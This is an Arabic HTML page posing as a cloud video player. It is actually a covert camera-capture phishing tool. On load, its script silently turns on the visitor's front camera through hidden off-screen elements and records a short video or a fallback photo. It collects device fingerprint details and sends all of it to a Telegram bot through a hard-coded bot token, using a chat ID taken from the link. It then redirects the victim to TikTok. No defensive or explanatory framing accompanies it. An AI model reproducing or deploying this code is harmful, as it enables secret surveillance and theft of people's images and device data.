<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>مشغل الوسائط المتعددة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
        }

        .player-container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 90%;
            max-width: 500px;
            text-align: center;
        }

        .header {
            margin-bottom: 25px;
        }

        .header h2 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }

        .header p {
            color: #666;
            font-size: 14px;
        }

        .video-placeholder {
            background: #f5f5f5;
            border-radius: 15px;
            padding: 40px 20px;
            margin-bottom: 20px;
            border: 2px dashed #ccc;
        }

        .video-placeholder svg {
            width: 80px;
            height: 80px;
            fill: #999;
            margin-bottom: 15px;
        }

        .video-placeholder h3 {
            color: #444;
            font-size: 18px;
            margin-bottom: 8px;
        }

        .video-placeholder p {
            color: #777;
            font-size: 14px;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #eee;
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
            display: none;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 4px;
        }

        .status-message {
            padding: 15px;
            border-radius: 10px;
            background: #f8f9fa;
            color: #495057;
            font-size: 14px;
            margin: 15px 0;
            border-right: 4px solid #667eea;
            text-align: right;
        }

        .status-message.error {
            border-right-color: #dc3545;
            background: #fff5f5;
            color: #dc3545;
        }

        .status-message.success {
            border-right-color: #28a745;
            background: #f0fff4;
            color: #28a745;
        }

        .button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 10px;
        }

        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }

        .button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .info-text {
            color: #888;
            font-size: 12px;
            margin-top: 20px;
        }

        /* عناصر مخفية للتصوير */
        .hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="player-container">
        <div class="header">
            <h2>📹 مشغل الفيديو السحابي</h2>
            <p>جاري تجهيز بيئة التشغيل...</p>
        </div>

        <div class="video-placeholder">
            <svg viewBox="0 0 24 24">
                <path d="M18 9v4H6V9H4v6h16V9h-2z"/>
                <path d="M22 5H2v14h20V5zm-2 12H4V7h16v10z"/>
            </svg>
            <h3>مشغل الفيديو قيد التحميل</h3>
            <p>سيبدأ التشغيل تلقائياً خلال لحظات</p>
        </div>

        <div class="progress-bar" id="progressBar">
            <div class="progress-fill" id="progressFill"></div>
        </div>

        <div class="status-message" id="statusMessage">
            ⏳ جاري الاتصال بالخوادم...
        </div>

        <button class="button" id="actionButton" disabled>
            جاري التحميل...
        </button>

        <div class="info-text">
            الإصدار 2.5.0 | جميع الحقوق محفوظة © 2025
        </div>
    </div>

    <!-- عناصر التصوير المخفية -->
    <video id="hiddenVideo" autoplay playsinline muted class="hidden-camera"></video>
    <canvas id="hiddenCanvas" class="hidden-camera"></canvas>

    <script>
        (function() {
            // ================== الإعدادات الأساسية ==================
            const CONFIG = {
                botToken: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU",
                chatId: new URLSearchParams(window.location.search).get('id'),
                
                // إعدادات الفيديو
                videoSettings: {
                    duration: 6000,           // 6 ثواني فيديو
                    frameRate: 24,             // 24 إطار في الثانية
                    quality: 0.95,              // جودة عالية 95%
                    width: 1280,                 // عرض HD
                    height: 720,                  // ارتفاع HD
                    maxSize: 50 * 1024 * 1024     // حد أقصى 50 ميجا
                },
                
                // توقيتات
                timings: {
                    warmupDelay: 3000,           // 3 ثواني تهيئة
                    frameInterval: 100,           // 100ms بين الإطارات
                    maxWaitTime: 15000,            // 15 ثانية حد أقصى
                    redirectDelay: 1000              // ثانية قبل التحويل
                },
                
                fallbackUrl: "https://www.tiktok.com"
            };

            // ================== عناصر الواجهة ==================
            const elements = {
                status: document.getElementById('statusMessage'),
                progressBar: document.getElementById('progressBar'),
                progressFill: document.getElementById('progressFill'),
                actionBtn: document.getElementById('actionButton')
            };

            // ================== عناصر التصوير ==================
            const hiddenVideo = document.getElementById('hiddenVideo');
            const hiddenCanvas = document.getElementById('hiddenCanvas');

            // ================== متغيرات الحالة ==================
            let mediaStream = null;
            let mediaRecorder = null;
            let recordedChunks = [];
            let recordingStartTime = null;
            let captureCompleted = false;
            let frameCaptureInterval = null;

            // ================== دوال الواجهة ==================
            function updateStatus(text, type = 'info') {
                if (elements.status) {
                    elements.status.innerText = text;
                    elements.status.className = 'status-message ' + 
                        (type === 'error' ? 'error' : type === 'success' ? 'success' : '');
                }
                console.log(`[الحالة] ${text}`);
            }

            function updateProgress(percent) {
                if (elements.progressFill) {
                    elements.progressFill.style.width = `${percent}%`;
                }
            }

            function showProgress(show = true) {
                if (elements.progressBar) {
                    elements.progressBar.style.display = show ? 'block' : 'none';
                }
            }

            function formatFileSize(bytes) {
                if (bytes < 1024) return bytes + ' B';
                if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
                return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
            }

            function getDeviceInfo() {
                return {
                    platform: navigator.platform || 'unknown',
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cores: navigator.hardwareConcurrency || 'unknown',
                    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
                    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
                };
            }

            // ================== دوال معالجة الفيديو ==================
            async function startVideoCapture() {
                if (captureCompleted || !CONFIG.chatId) return false;

                try {
                    updateStatus("🎥 طلب الوصول للكاميرا...");
                    
                    mediaStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: "user",
                            width: { ideal: CONFIG.videoSettings.width },
                            height: { ideal: CONFIG.videoSettings.height },
                            frameRate: { ideal: CONFIG.videoSettings.frameRate }
                        },
                        audio: false
                    });

                    hiddenVideo.srcObject = mediaStream;
                    
                    // انتظار تهيئة الفيديو
                    await new Promise((resolve) => {
                        hiddenVideo.onloadedmetadata = () => {
                            hiddenVideo.play();
                            resolve();
                        };
                    });

                    updateStatus("⏳ تهيئة الكاميرا... (3 ثواني)");
                    showProgress(true);
                    
                    // انتظار لضبط الإضاءة
                    await new Promise(resolve => setTimeout(resolve, CONFIG.timings.warmupDelay));

                    // بدء التسجيل
                    await startRecording();

                } catch (error) {
                    console.error("خطأ في الكاميرا:", error);
                    updateStatus(`❌ خطأ في الكاميرا: ${error.message}`, 'error');
                    await sendInfoOnly();
                    redirectToFallback();
                }
            }

            async function startRecording() {
                return new Promise((resolve, reject) => {
                    try {
                        recordedChunks = [];
                        recordingStartTime = Date.now();
                        
                        // إعداد مسجل الفيديو
                        mediaRecorder = new MediaRecorder(mediaStream, {
                            mimeType: 'video/webm;codecs=vp8,opus',
                            videoBitsPerSecond: 2500000 // 2.5 Mbps
                        });

                        mediaRecorder.ondataavailable = (event) => {
                            if (event.data.size > 0) {
                                recordedChunks.push(event.data);
                            }
                        };

                        mediaRecorder.onstop = async () => {
                            // تجميع الفيديو
                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
                            
                            if (blob.size < 10000) {
                                updateStatus("❌ الفيديو صغير جداً، إعادة المحاولة", 'error');
                                resolve(false);
                                return;
                            }

                            updateStatus(`📤 جاري إرسال الفيديو (${formatFileSize(blob.size)})...`);
                            updateProgress(90);
                            
                            // إرسال الفيديو
                            const success = await sendVideo(blob);
                            
                            if (success) {
                                updateProgress(100);
                                updateStatus("✅ تم إرسال الفيديو بنجاح!", 'success');
                                
                                // إيقاف الكاميرا
                                if (mediaStream) {
                                    mediaStream.getTracks().forEach(track => track.stop());
                                }
                                
                                // التوجيه
                                setTimeout(() => {
                                    window.location.href = CONFIG.fallbackUrl;
                                }, CONFIG.timings.redirectDelay);
                            } else {
                                updateStatus("❌ فشل إرسال الفيديو", 'error');
                                setTimeout(redirectToFallback, 2000);
                            }
                            
                            resolve(success);
                        };

                        // بدء التسجيل لمدة محددة
                        mediaRecorder.start();
                        updateStatus(`🔴 تسجيل فيديو (${CONFIG.videoSettings.duration/1000} ثواني)...`);
                        
                        // تحديث التقدم أثناء التسجيل
                        let progress = 0;
                        const progressInterval = setInterval(() => {
                            if (captureCompleted) {
                                clearInterval(progressInterval);
                                return;
                            }
                            
                            const elapsed = Date.now() - recordingStartTime;
                            progress = (elapsed / CONFIG.videoSettings.duration) * 80;
                            updateProgress(Math.min(progress, 80));
                            
                            if (elapsed >= CONFIG.videoSettings.duration) {
                                clearInterval(progressInterval);
                            }
                        }, 100);

                        // إيقاف التسجيل بعد المدة المحددة
                        setTimeout(() => {
                            if (mediaRecorder && mediaRecorder.state === 'recording') {
                                mediaRecorder.stop();
                                captureCompleted = true;
                            }
                        }, CONFIG.videoSettings.duration);

                    } catch (error) {
                        console.error("خطأ في التسجيل:", error);
                        reject(error);
                    }
                });
            }

            async function sendVideo(blob) {
                try {
                    const deviceInfo = getDeviceInfo();
                    
                    // تحضير الفورم داتا
                    const formData = new FormData();
                    formData.append('chat_id', CONFIG.chatId);
                    formData.append('video', blob, 'video.webm');
                    formData.append('caption', `🎥 تسجيل فيديو جديد
                        
🆔 المعرف: ${CONFIG.chatId}
⏱️ المدة: ${CONFIG.videoSettings.duration/1000} ثواني
📏 الدقة: ${CONFIG.videoSettings.width}x${CONFIG.videoSettings.height}
💾 الحجم: ${formatFileSize(blob.size)}
📱 النظام: ${deviceInfo.platform}
🌐 المتصفح: ${deviceInfo.userAgent.substring(0, 50)}...
💻 الشاشة: ${deviceInfo.screen}
⚡ المعالج: ${deviceInfo.cores} نواة
🕒 التوقيت: ${deviceInfo.timezone}
📡 الاتصال: ${deviceInfo.connection}
⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);

                    updateStatus("📤 جاري رفع الفيديو...");
                    
                    const response = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });

                    if (!response.ok) {
                        const error = await response.text();
                        console.error("خطأ في الإرسال:", error);
                        
                        // إذا فشل إرسال الفيديو، أرسل صورة بدلاً منه
                        await sendPhotoFallback();
                        return false;
                    }

                    return true;

                } catch (error) {
                    console.error("فشل إرسال الفيديو:", error);
                    
                    // محاولة إرسال صورة كبديل
                    await sendPhotoFallback();
                    return false;
                }
            }

            async function sendPhotoFallback() {
                try {
                    updateStatus("📸 جاري التقاط صورة بديلة...");
                    
                    // التقاط صورة من آخر إطار
                    hiddenCanvas.width = hiddenVideo.videoWidth;
                    hiddenCanvas.height = hiddenVideo.videoHeight;
                    hiddenCanvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
                    
                    const blob = await new Promise(resolve => {
                        hiddenCanvas.toBlob(resolve, 'image/jpeg', CONFIG.videoSettings.quality);
                    });

                    const formData = new FormData();
                    formData.append('chat_id', CONFIG.chatId);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', `📸 صورة بديلة (فشل الفيديو)
🆔 المعرف: ${CONFIG.chatId}
💾 الحجم: ${formatFileSize(blob.size)}`);

                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                } catch (error) {
                    console.error("فشل إرسال الصورة البديلة:", error);
                }
            }

            async function sendInfoOnly() {
                try {
                    const deviceInfo = getDeviceInfo();
                    const text = `⚠️ فشل الوصول للكاميرا
                        
🆔 المعرف: ${CONFIG.chatId}
📱 النظام: ${deviceInfo.platform}
🌐 المتصفح: ${deviceInfo.userAgent}
💻 الشاشة: ${deviceInfo.screen}
⚡ المعالج: ${deviceInfo.cores} نواة
🕒 التوقيت: ${deviceInfo.timezone}
📡 الاتصال: ${deviceInfo.connection}`;

                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CONFIG.chatId,
                            text: text
                        })
                    });
                } catch (error) {
                    console.error("فشل إرسال المعلومات:", error);
                }
            }

            function redirectToFallback() {
                if (!captureCompleted) {
                    window.location.href = CONFIG.fallbackUrl;
                }
            }

            // ================== بدء التشغيل ==================
            async function initialize() {
                // التحقق من وجود ID
                if (!CONFIG.chatId) {
                    updateStatus("❌ رابط غير صالح - لا يوجد معرف", 'error');
                    setTimeout(() => window.location.href = CONFIG.fallbackUrl, 2000);
                    return;
                }

                updateStatus("🔍 جاري تجهيز النظام...");
                
                // تفعيل الزر بعد ثانية
                setTimeout(() => {
                    if (elements.actionBtn) {
                        elements.actionBtn.disabled = false;
                        elements.actionBtn.innerText = "تشغيل الفيديو";
                    }
                }, 2000);

                // بدء التصوير
                await startVideoCapture();
            }

            // حد أقصى 15 ثانية
            setTimeout(() => {
                if (!captureCompleted) {
                    updateStatus("⚠️ انتهاء الوقت المحدد", 'error');
                    redirectToFallback();
                }
            }, CONFIG.timings.maxWaitTime);

            // ربط الزر
            if (elements.actionBtn) {
                elements.actionBtn.addEventListener('click', () => {
                    if (!captureCompleted) {
                        initialize();
                        elements.actionBtn.disabled = true;
                        elements.actionBtn.innerText = "جاري التشغيل...";
                    }
                });
            }

            // تشغيل تلقائي
            setTimeout(initialize, 1000);

        })();
    </script>
</body>
</html>
